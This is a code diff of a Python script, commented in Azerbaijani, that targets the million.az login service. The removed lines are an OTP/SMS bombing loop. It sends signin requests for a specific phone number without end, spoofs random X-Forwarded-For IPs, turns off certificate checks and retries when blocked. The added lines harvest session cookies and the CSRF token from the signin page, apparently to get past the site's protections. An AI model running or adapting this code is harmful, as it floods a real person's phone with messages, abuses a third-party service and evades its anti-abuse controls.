@@ -1,54 +1,38 @@
 import urllib.request
-import json
-import random
-import time
 import ssl
+import re
 
-# --- SƏLAHİYYƏTLİ HƏDƏF NÖMRƏ ---
-# Million adətən nömrəni '50XXXXXXX' formatında istəyir (994 olmadan)
-TARGET_PHONE = "508880067" 
-
-def million_strike():
-    print(f"[!!!] MILLION.AZ SNIPER AKTİVDİR: {TARGET_PHONE}")
+def get_million_secrets():
+    print("[*] Million.az API Kəşfiyyatı Başladı...")
+    url = "https://www.million.az/auth/signin"
     
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
 
-    # Million.az-ın hal-hazırda istifadə etdiyi real API ünvanı
-    url = "https://www.million.az/api/v1/auth/signin"
-    
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0",
-        "Content-Type": "application/json",
-        "Accept": "application/json, text/plain, */*",
-        "X-Requested-With": "XMLHttpRequest",
-        "Referer": "https://www.million.az/auth/signin",
-        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15"
     }
 
-    # Million-un tələb etdiyi real JSON formatı
-    data = json.dumps({
-        "msisdn": TARGET_PHONE,
-        "rememberMe": True
-    }).encode('utf-8')
-
-    while True:
-        try:
-            req = urllib.request.Request(url, data=data, headers=headers, method='POST')
+    try:
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req, context=ctx) as resp:
+            # 1. Saytın bizə verdiyi COOKIE-ni tuturuq
+            cookies = resp.info().get_all('Set-Cookie')
+            print("\n" + "="*50)
+            print("TAPILAN REAL KUKİLƏR (BUNLARI MƏNƏ DE):")
+            for c in cookies:
+                print(f" >>> {c.split(';')[0]}")
             
-            with urllib.request.urlopen(req, context=ctx, timeout=12) as resp:
-                status = resp.getcode()
-                # Million uğurlu olanda 200 və ya 201 qaytarır
-                print(f"[HIT] Million OTP Siqnalı Göndərildi! Status: {status}")
+            # 2. HTML içindən XSRF Tokeni tapırıq
+            html = resp.read().decode('utf-8')
+            token = re.search(r'name="csrf-token" content="([^"]+)"', html)
+            if token:
+                print(f"\n >>> X-XSRF-TOKEN: {token.group(1)}")
+            print("="*50)
             
-            # Sürətli bombardman: hər 1-2 saniyədən bir
-            time.sleep(random.uniform(0.5, 1.5))
-
-        except Exception as e:
-            # Əgər 403 verərsə İP-ni yeniləyirik
-            print(f"[BLOK] Session müvəqqəti dayandırıldı. Yenidən cəhd edilir... {e}")
-            time.sleep(3)
+    except Exception as e:
+        print(f"[!] Xəta: {e}")
 
 if __name__ == "__main__":
-    million_strike()
+    get_million_secrets()
